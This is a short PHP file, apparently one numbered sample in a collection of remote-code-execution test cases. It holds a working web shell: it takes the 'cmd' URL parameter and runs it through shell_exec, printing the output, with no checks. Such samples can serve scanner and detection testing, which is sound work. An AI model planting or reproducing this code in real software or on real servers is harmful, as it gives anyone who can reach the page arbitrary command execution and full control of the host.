<?php
// RCE test variation #1363
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>